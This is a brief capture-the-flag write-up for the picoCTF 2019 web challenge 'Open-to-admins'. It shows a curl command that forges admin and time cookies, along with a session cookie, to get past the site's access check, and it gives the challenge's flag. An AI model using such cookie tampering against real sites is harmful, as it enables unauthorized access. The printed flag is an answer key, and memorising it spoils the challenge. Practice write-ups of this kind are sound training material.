# Open-to-admins - Points: 200
<b>Description : </b>This secure website allows users to access the flag only if they are admin and if the time is exactly 1400. https://2019shell1.picoctf.com/problem/45127/ (link) or http://2019shell1.picoctf.com:45127<br>
<b>Hints : </b>Can cookies help you to get the flag?
# Solved
Add header cookie
```
admin=True;
time=1400;
```
and you will got the flag! using this command
```
curl -L 'https://2019shell1.picoctf.com/flag' -H 'Cookie: _ga=GA1.2.525613959.1599610026; _gid=GA1.2.588003444.1599610026; session=.eJwdi1EKwkAMBa_yyM_-iAfwBp5BiixttKG7CSQRKaV3d_FrYJg56PlqNVYOuj0OQg7Qt7qKvulC99IR5r5DEotxaEk0sw1NNsZuH1Rn5MqoSxeF-ShL_I3oPFaeEymdrzSd0_kDY1ImxQ.X1tZ_Q.7napD73w3WjBafdw0F4oYJ5pBzQ; admin=True; time=1400' -H "Referer: https://2019shell1.picoctf.com/prob
lem/45127/"
```
Flag : <b>picoCTF{0p3n_t0_adm1n5_42e59862}</b>
